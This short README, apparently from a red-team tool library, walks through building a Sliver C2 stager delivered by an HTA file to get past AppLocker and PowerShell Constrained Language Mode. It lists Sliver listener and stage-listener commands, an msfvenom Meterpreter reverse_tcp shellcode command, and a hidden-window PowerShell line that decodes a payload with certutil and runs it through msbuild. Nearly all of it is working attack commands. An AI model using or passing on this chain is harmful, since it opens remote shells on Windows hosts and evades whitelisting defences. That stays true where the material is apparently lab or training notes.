# Overview

## References
Sliver staged payload: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader/sliver.ps1
XML Payload: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader/runner.xml
HTA Template: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader/runner.hta

## Sliver Setup
```bash
# Create profile local64 and point to port 443
sliver > profiles new --http 192.168.45.227:8080 --format shellcode local64

# Setup main listener with google.crt / key generated with metasploit
sliver > http -L 192.168.45.227 -l 8080

# Setup the main stager 
sliver > stage-listener --url tcp://192.168.45.227:8064 --profile local64
```

## Prepare Sliver Payload
```bash
# payload for the powershellCodeRunner 64-bit
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8064 EXITFUNC=thread -f csharp

# Copy contents into sliver.ps1 (line 43)
```

## Prepare HTA XML runner 
```bash
# Update the runner.xml with the URI that corresponds to kali hosted webserver

# Encode the runner.xml into base64 and outputs contents into encoded.txt 
┌──(kali㉿kali)-[~]
└─$ pwsh ./HTA-powershellEncoder.ps1

# Copy contents into runner.hta 
powershell -windowstyle hidden echo <insert here> > c:\\windows\\temp\\enc.txt;certutil -decode c:\\windows\\temp\\enc.txt c:\\windows\\temp\\a.xml;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe C:\\windows\\temp\\a.xml
```

